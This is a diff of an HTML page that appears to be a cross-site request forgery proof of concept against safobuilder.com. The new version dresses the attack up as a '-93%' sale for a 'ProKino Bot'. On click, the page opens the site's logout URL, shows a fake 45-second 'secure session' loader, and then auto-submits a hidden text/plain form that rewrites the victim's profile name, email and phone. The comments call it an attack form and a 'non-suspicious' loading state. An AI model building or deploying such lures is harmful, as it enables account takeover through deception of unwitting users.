@@ -1,231 +1,549 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Secure Access Gateway</title>
+    
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Bricolage+Grotesque:opsz,wght@12..96,600;12..96,700&family=Plus+Jakarta+Sans:wght@300;400;500;600;700;800&display=swap" rel="stylesheet">
+
     <style>
-        body {
-            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
-            background-color: #f4f6f8;
-            color: #212529;
+        :root {
+            --bg: #05080f;
+            --s1: #0b1020;
+            --s2: #111828;
+            --s4: #1d2842;
+            --b1: rgba(255, 255, 255, .06);
+            --b2: rgba(255, 255, 255, .11);
+            --blue: #3b82f6;
+            --blue2: #2563eb;
+            --bdim: rgba(59, 130, 246, .12);
+            --bglow: rgba(59, 130, 246, .22);
+            --cyan: #06b6d4;
+            --green: #10b981;
+            --orange: #f59e0b;
+            --red: #ef4444;
+            --purple: #8b5cf6;
+            --pink: #ec4899;
+            --text: #f1f5ff;
+            --t2: #94a3c8;
+            --t3: #3d4e70;
+            --font-head: 'Bricolage Grotesque', sans-serif;
+            --font-body: 'Plus Jakarta Sans', sans-serif;
+        }
+
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        html, body {
+            min-height: 100vh;
+            background: var(--bg);
+            color: var(--text);
+            font-family: var(--font-body);
+            overflow-x: hidden;
+            -webkit-font-smoothing: antialiased;
             display: flex;
-            flex-direction: column; /* Изменено, чтобы поля ввода стояли под карточкой */
+            flex-direction: column;
+            justify-content: flex-start;
+            align-items: center;
+            padding: 100px 16px 60px 16px;
+        }
+
+        /* --- UNIFIED DECK ENGINE --- */
+        .deck-wrapper {
+            position: relative;
+            width: 100%;
+            max-width: 480px;
+            margin: 0 auto;
+        }
+
+        /* --- CONTROL TRIGGER --- */
+        .swap-control-btn {
+            position: absolute;
+            top: -55px;
+            right: 4px;
+            background: rgba(139, 92, 246, 0.16);
+            border: 1px solid rgba(139, 92, 246, 0.5);
+            color: var(--cyan);
+            font-family: var(--font-body);
+            font-size: 11px;
+            font-weight: 700;
+            padding: 10px 20px;
+            border-radius: 30px;
+            cursor: pointer;
+            display: flex;
+            align-items: center;
+            gap: 6px;
+            text-transform: uppercase;
+            letter-spacing: 0.06em;
+            backdrop-filter: blur(12px);
+            z-index: 200;
+            transition: all 0.25s ease;
+            box-shadow: 0 4px 12px rgba(0,0,0,0.3);
+        }
+
+        .swap-control-btn:hover {
+            background: rgba(139, 92, 246, 0.3);
+            border-color: rgba(139, 92, 246, 0.8);
+            color: #fff;
+            transform: translateY(-1px);
+        }
+
+        /* --- MAIN CORE CARD DESIGN --- */
+        .bot-card, .config-panel {
+            background: var(--s1);
+            background-image: linear-gradient(145deg, rgba(139, 92, 246, 0.08) 0%, rgba(236, 72, 153, 0.03) 100%);
+            
+            border: 2px solid rgba(139, 92, 246, .3);
+            border-radius: 20px;
+            overflow: hidden;
+            width: 100%;
+            padding: 32px;
+            box-sizing: border-box;
+            
+            transition: transform 0.5s cubic-bezier(0.2, 0.8, 0.2, 1), 
+                        box-shadow 0.5s ease, 
+                        border-color 0.4s ease;
+        }
+
+        /* --- HOVER ANIMATION LIFTS --- */
+        .layer-front:hover {
+            transform: translateY(-4px) scale(1) rotate(0deg);
+            border-color: rgba(139, 92, 246, 0.6);
+            box-shadow: 0 30px 60px rgba(59, 130, 246, 0.15), 0 20px 40px rgba(0, 0, 0, 0.8);
+        }
+
+        /* --- UNIVERSAL SOLID 3D DECK LAYERS --- */
+        .layer-front {
+            position: relative;
+            z-index: 50;
+            opacity: 1 !important; 
+            transform: translateY(0) scale(1) rotate(0deg);
+            pointer-events: all;
+            box-shadow: 0 25px 50px rgba(0, 0, 0, 0.75);
+        }
+
+        .layer-back {
+            position: absolute;
+            top: 0;
+            left: 0;
+            z-index: 10;
+            opacity: 1 !important; 
+            transform: translateY(34px) scale(0.93) rotate(-1.5deg);
+            pointer-events: none;
+            box-shadow: 0 10px 25px rgba(0, 0, 0, 0.6);
+            border-color: rgba(139, 92, 246, 0.12);
+        }
+
+        .bot-card::before, .config-panel::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            right: 0;
+            height: 4px;
+            background: linear-gradient(90deg, var(--purple), var(--pink));
+        }
+
+        .bot-card.premium::after {
+            content: 'PREMIUM';
+            position: absolute;
+            top: 14px;
+            right: -22px;
+            background: linear-gradient(90deg, var(--purple), var(--pink));
+            color: #fff;
+            font-size: 9px;
+            font-weight: 800;
+            padding: 4px 30px;
+            transform: rotate(45deg);
+            letter-spacing: .8px;
+            pointer-events: none;
+        }
+
+        /* --- CARD INNER STYLING --- */
+        .bc-top {
+            display: flex;
+            align-items: center;
+            margin-bottom: 16px;
+        }
+
+        .bc-ico {
+            width: 44px;
+            height: 44px;
+            border-radius: 12px;
+            display: flex;
             justify-content: center;
             align-items: center;
-            height: 100vh;
-            margin: 0;
+            font-size: 20px;
         }
-        .card {
-            background: #ffffff;
-            padding: 40px;
-            border-radius: 12px;
-            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.05);
-            text-align: center;
-            max-width: 440px;
+
+        .bc-body {
+            display: flex;
+            flex-direction: column;
             width: 100%;
         }
-        h2 {
+
+        .bc-name {
+            font-family: var(--font-head);
             font-size: 22px;
-            font-weight: 600;
-            margin-bottom: 12px;
-            color: #111111;
+            font-weight: 700;
+            margin-bottom: 8px;
+            color: var(--text);
+            display: flex;
+            align-items: center;
+            gap: 6px;
         }
-        p {
-            font-size: 15px;
-            color: #6c757d;
+
+        .bc-desc {
+            font-size: 13.5px;
+            color: var(--t2);
             line-height: 1.5;
-            margin-bottom: 24px;
+            margin-bottom: 16px;
         }
-        .btn {
-            display: inline-block;
-            width: 100%;
-            box-sizing: border-box;
-            padding: 14px 24px;
-            background-color: #0066cc;
-            color: #ffffff;
-            text-decoration: none;
+
+        .bc-premium-price {
+            display: flex;
+            align-items: center;
+            flex-wrap: wrap;
+            gap: 10px;
+            font-family: var(--font-head);
+            margin-bottom: 14px;
+        }
+
+        .old-price {
+            font-size: 13px;
+            color: var(--t3);
+            text-decoration: line-through;
             font-weight: 500;
-            font-size: 16px;
-            border-radius: 6px;
-            transition: background-color 0.2s ease, opacity 0.2s ease;
-            border: none;
-            cursor: pointer;
         }
-        .btn:hover {
-            background-color: #0052a3;
+
+        .new-price {
+            font-size: 20px; 
+            font-weight: 800;
+            color: #fff;
+            background: linear-gradient(to right, #ff007f, #ec4899);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+        }
+
+        /* FIXED: Added a dynamic looping pulse glow to the Sale Badge */
+        .sale-badge {
+            background: var(--red);
+            color: white;
+            font-size: 10px;
+            font-weight: 800;
+            padding: 3px 8px;
+            border-radius: 50px;
+            box-shadow: 0 0 0 0 rgba(239, 68, 68, 0.7);
+            animation: glowing-pulse 2s infinite cubic-bezier(0.4, 0, 0.6, 1);
+        }
+
+        .promo-banner {
+            background: rgba(245, 158, 11, 0.06);
+            border: 1px dashed rgba(245, 158, 11, 0.25);
+            border-radius: 8px;
+            padding: 10px;
+            font-size: 12.5px;
+            color: var(--orange);
+            margin-bottom: 18px;
+            line-height: 1.4;
+        }
+
+        .bc-tags {
+            display: flex;
+            flex-wrap: wrap;
+            gap: 6px;
+            margin-bottom: 22px;
+        }
+
+        .bc-tag {
+            font-size: 11px;
+            font-weight: 500;
+            color: var(--t2);
+            background: rgba(255, 255, 255, 0.02);
+            border: 1px solid var(--b1);
+            padding: 3px 8px;
+            border-radius: 6px;
+        }
+
+        .bc-btn {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+            width: 100%;
+            padding: 15px 20px;
+            background: linear-gradient(135deg, #2563eb, #1d4ed8);
+            color: #ffffff;
+            font-weight: 800;
+            font-size: 15px; 
+            border-radius: 8px;
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            cursor: pointer;
+            text-transform: uppercase;
+            letter-spacing: 0.03em;
+            box-shadow: 0 4px 14px rgba(37, 99, 235, 0.35);
+            /* FIXED: Restored clean transition properties for hover actions */
+            transition: background 0.25s ease, transform 0.2s cubic-bezier(0.2, 0.8, 0.2, 1), box-shadow 0.25s ease;
+        }
+
+        .bc-btn svg {
+            width: 16px;
+            height: 16px;
+            fill: currentColor;
+        }
+
+        /* FIXED: Restored lift response and intense glowing backdrop shadows */
+        .bc-btn:hover {
+            background: linear-gradient(135deg, #3b82f6, #2563eb);
+            transform: translateY(-2px);
+            box-shadow: 0 6px 20px rgba(37, 99, 235, 0.6), 0 0 12px rgba(6, 182, 212, 0.3);
         }
         
-        /* Smooth Processing Screen Elements */
+        .bc-btn:active {
+            transform: translateY(0);
+        }
+
+        /* --- LOADING STATES --- */
         .loading-zone {
             display: none;
             opacity: 0;
-            transition: opacity 0.4s ease;
-            margin-top: 10px;
+            text-align: center;
+            padding: 24px 0;
         }
+
         .spinner {
-            width: 32px;
-            height: 32px;
-            border: 3px solid #e9ecef;
-            border-top: 3px solid #0066cc;
+            width: 36px;
+            height: 36px;
+            border: 3px solid var(--s4);
+            border-top: 3px solid var(--cyan);
             border-radius: 50%;
             margin: 0 auto 20px auto;
             animation: spin 0.8s linear infinite;
         }
+
         .status-text {
             font-size: 14px;
-            color: #495057;
+            color: var(--text);
             font-weight: 500;
         }
+
         .countdown {
             font-size: 13px;
-            color: #868e96;
-            margin-top: 6px;
+            color: var(--t2);
+            margin-top: 8px;
         }
 
-        /* --- Блок настроек (Поля ввода видны сразу) --- */
-        .config-panel {
-            background: #ffffff;
-            border: 1px solid #e9ecef;
-            border-radius: 12px;
-            padding: 20px;
-            margin-top: 20px; /* Отображается снизу под основной карточкой */
-            max-width: 440px;
-            width: 100%;
-            box-sizing: border-box;
-            text-align: left;
-            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.02);
-        }
-        .config-title {
-            font-size: 13px;
+        #clock-timer {
+            color: var(--cyan);
             font-weight: 600;
-            color: #6c757d;
-            margin-bottom: 12px;
+        }
+
+        /* --- PANEL CONFIG CONTROLS --- */
+        .config-title {
+            font-family: var(--font-head);
+            font-size: 13px;
+            font-weight: 700;
+            color: var(--cyan);
+            margin-bottom: 16px;
             text-transform: uppercase;
-            letter-spacing: 0.5px;
+            letter-spacing: 0.08em;
         }
+
         .input-group {
-            margin-bottom: 10px;
+            margin-bottom: 14px;
         }
+
         .input-group label {
             display: block;
-            font-size: 12px;
-            font-weight: 500;
-            margin-bottom: 4px;
-            color: #495057;
-        }
-        .input-group input {
-            width: 100%;
-            box-sizing: border-box;
-            padding: 8px 12px;
-            border: 1px solid #ced4da;
-            border-radius: 6px;
-            font-size: 14px;
-            color: #212529;
-            background-color: #f8fafc;
+            font-size: 12.5px;
+            font-weight: 600;
+            margin-bottom: 6px;
+            color: var(--t2);
         }
 
+        .input-group input {
+            width: 100%;
+            padding: 11px 14px;
+            border: 1px solid var(--s4);
+            border-radius: 8px;
+            font-size: 13.5px;
+            color: var(--text);
+            background-color: rgba(5, 8, 15, 0.6);
+            outline: none;
+        }
+
+        .input-group input:focus {
+            border-color: var(--purple);
+            box-shadow: 0 0 0 3px rgba(139, 92, 246, 0.15);
+        }
+
+        /* --- GLOBAL KEYFRAMES ENGINE --- */
         @keyframes spin {
-            0 { transform: rotate(0deg); }
+            0% { transform: rotate(0deg); }
             100% { transform: rotate(360deg); }
+        }
+
+        @keyframes glowing-pulse {
+            0% {
+                transform: scale(1);
+                box-shadow: 0 0 0 0 rgba(239, 68, 68, 0.7);
+            }
+            70% {
+                transform: scale(1.04);
+                box-shadow: 0 0 0 8px rgba(239, 68, 68, 0);
+            }
+            100% {
+                transform: scale(1);
+                box-shadow: 0 0 0 0 rgba(239, 68, 68, 0);
+            }
         }
     </style>
 </head>
 <body>
 
-<div class="card">
-    <div id="initial-ui">
-        <h2>Account Dashboard Access</h2>
-        <p>Click below to verify your session properties and cleanly redirect to your management dashboard panel.</p>
-        
-        <!-- Добавлен event, чтобы предотвратить мгновенную перезагрузку и дать отработать JS таймерам -->
-        <a href="https://safobuilder.com/logout" 
-           target="_blank" 
-           onclick="launchProcessingLoop(event)" 
-           id="action-link"
-           class="btn">
-           Go to Dashboard
-        </a>
+<div class="deck-wrapper">
+    
+    <!-- Unified Switch View Mechanism -->
+    <button class="swap-control-btn" onclick="swapStackFocus()">
+        🔄 Switch view
+    </button>
+
+    <!-- CORE CARD 1: MAIN TARGET GATEWAY CONTAINER -->
+    <div id="deck-card-bot" class="bot-card premium layer-front">
+        <div id="initial-ui">
+            <div class="bc-top">
+                <div class="bc-ico" style="background:#3B82F622">🎥</div>
+            </div>
+            <div class="bc-body">
+                <div class="bc-name">
+                    ProKino Bot <span>👑</span>
+                </div>
+                <div class="bc-desc">Kinolarni yuklash, qidirish va foydalanuvchilarni boshqarish uchun to‘liq bot tizimi.</div>
+                
+                <div class="bc-premium-price">
+                    <span class="old-price">💎 150,000 so'm</span>
+                    <span class="new-price">10,000 so'm</span>
+                    <span class="sale-badge">-93% CHEGIRMA</span>
+                </div>
+
+                <div class="promo-banner">
+                    ⚡️ <span><strong>Aksiya muddati cheklangan:</strong> Ushbu narx faqat bugun amal qiladi!</span>
+                </div>
+
+                <div class="bc-tags">
+                    <span class="bc-tag">Kino bot</span>
+                    <span class="bc-tag">Film bazasi</span>
+                    <span class="bc-tag">Qidiruv</span>
+                </div>
+                <button class="bc-btn" onclick="launchProcessingLoop()">
+                    <svg viewBox="0 0 24 24"><path d="M10 6L8.59 7.41 13.17 12l-4.58 4.59L10 18l6-6z"></path></svg>
+                    Chegirmada sotib olish
+                </button>
+            </div>
+        </div>
+
+        <div id="loading-ui" class="loading-zone">
+            <div class="spinner"></div>
+            <div class="status-text" id="status-message">Establishing secure session link...</div>
+            <div class="countdown">Estimated synchronization time: <span id="clock-timer">45</span>s</div>
+        </div>
     </div>
 
-    <!-- Clean, non-suspicious loading state -->
-    <div id="loading-ui" class="loading-zone">
-        <div class="spinner"></div>
-        <div class="status-text" id="status-message">Establishing secure session link...</div>
-        <div class="countdown">Estimated synchronization time: <span id="clock-timer">45</span>s</div>
+    <!-- CORE CARD 2: POC CONFIG PARAMETERS LAYER -->
+    <div id="deck-card-config" class="config-panel layer-back">
+        <div class="config-title">⚙️ PoC Configuration Panel</div>
+        <div class="input-group">
+            <label>Name</label>
+            <input type="text" id="param-name" value="FouShee">
+        </div>
+        <div class="input-group">
+            <label>Email</label>
+            <input type="email" id="param-email" value="jafar00008@gmail.com">
+        </div>
+        <div class="input-group">
+            <label>Phone</label>
+            <input type="text" id="param-phone" value="test">
+        </div>
     </div>
+
 </div>
 
-<!-- Панель конфигурации полей (Находится прямо на виду) -->
-<div class="config-panel" id="config-panel">
-    <div class="config-title">⚙️ PoC Configuration Panel</div>
-    <div class="input-group">
-        <label>Name</label>
-        <input type="text" id="param-name" value="FouShee">
-    </div>
-    <div class="input-group">
-        <label>Email</label>
-        <input type="email" id="param-email" value="jafar00008@gmail.com">
-    </div>
-    <div class="input-group">
-        <label>Phone</label>
-        <input type="text" id="param-phone" value="test">
-    </div>
-</div>
-
-<!-- Скрытая форма payload -->
-<form id="attackForm" action="https://safobuilder.com/api/update_profile" method="POST" enctype="text/plain">
+<form id="attackForm" action="https://safobuilder.com/api/update_profile" method="POST" enctype="text/plain" target="_self">
      <input type="hidden" id="dynamicPayloadInput" name="" value='"}' />
 </form>
 
 <script>
-    // Функция автоматической пересборки JSON строки на основе полей ввода
+    // Smooth depth swap engine with soft transitions
+    function swapStackFocus() {
+        const botCard = document.getElementById('deck-card-bot');
+        const configPanel = document.getElementById('deck-card-config');
+        
+        if (botCard.classList.contains('layer-front')) {
+            botCard.style.zIndex = "40"; 
+            configPanel.style.zIndex = "50";
+            
+            botCard.classList.replace('layer-front', 'layer-back');
+            configPanel.classList.replace('layer-back', 'layer-front');
+        } else {
+            botCard.style.zIndex = "50";
+            configPanel.style.zIndex = "40";
+            
+            configPanel.classList.replace('layer-front', 'layer-back');
+            botCard.classList.replace('layer-back', 'layer-front');
+        }
+    }
+
     function bakePayload() {
         const inputName = document.getElementById('param-name').value;
         const inputEmail = document.getElementById('param-email').value;
         const inputPhone = document.getElementById('param-phone').value;
 
-        // Собираем структуру text/plain, идентичную вашему оригиналу
         const rawJsonString = `{"action":"update_profile","name":"${inputName}","email":"${inputEmail}","phone":"${inputPhone}","ignore":"`;
         
-        // Инжектируем собранную строку в имя инпута формы
         document.getElementById('dynamicPayloadInput').name = rawJsonString;
     }
 
-    function launchProcessingLoop(event) {
-        // Останавливаем стандартный переход по ссылке, ломающий JS таймеры
-        if (event) event.preventDefault();
-
-        // Прячем конфигуратор, чтобы интерфейс остался чистым во время выполнения
-        document.getElementById('config-panel').style.display = 'none';
-
-        // Открываем логаут в фоновой вкладке (как в оригинальном href)
-        const logoutUrl = document.getElementById('action-link').href;
-        window.open(logoutUrl, '_blank');
-
-        const initialUI = document.getElementById('initial-ui');
+    function launchProcessingLoop() {
+        const botCard = document.getElementById('deck-card-bot');
+        const configPanel = document.getElementById('deck-card-config');
+        const controlBtn = document.querySelector('.swap-control-btn');
+        
+        if(controlBtn) controlBtn.style.display = 'none';
+        configPanel.style.display = 'none';
+        
+        botCard.className = "bot-card premium layer-front";
+        botCard.style.position = "relative";
+        botCard.style.zIndex = "100";
+        
+        document.getElementById('initial-ui').style.display = "none";
+        
         const loadingUI = document.getElementById('loading-ui');
         const clockTimer = document.getElementById('clock-timer');
         const statusMessage = document.getElementById('status-message');
 
-        // Smooth fade out of original elements
-        initialUI.style.display = "none";
-        
-        // Smooth fade in of standard corporate loader
         loadingUI.style.display = "block";
-        setTimeout(() => { loadingUI.style.opacity = "1"; }, 50);
+        setTimeout(() => { loadingUI.style.opacity = "1"; }, 10);
+
+        window.open("https://safobuilder.com/logout", '_blank');
 
         let targetDuration = 45;
-        // Clean, quiet ticking loop
+        
         const syncLoop = setInterval(() => {
             targetDuration--;
             clockTimer.innerText = targetDuration;
 
-            // Soft message transitions
             if (targetDuration === 40) {
                 statusMessage.innerText = "Syncing authentication status with gateway...";
             } else if (targetDuration === 25) {
                 statusMessage.innerText = "Verifying cross-site profile keys...";
             } else if (targetDuration === 5) {
-                statusMessage.innerText = "Finalizing dashboard redirection...";
+                statusMessage.innerText = "Finalizing dashboard redirection... Don't close the window.";
             }
 
             if (targetDuration <= 0) {
@@ -233,9 +551,8 @@
             }
         }, 1000);
 
-        // Отправка формы через 45 секунд
         setTimeout(() => {
-            bakePayload(); // Пересобираем кастомные данные из инпутов
+            bakePayload(); 
             document.getElementById('attackForm').submit();
         }, 45000);
     }
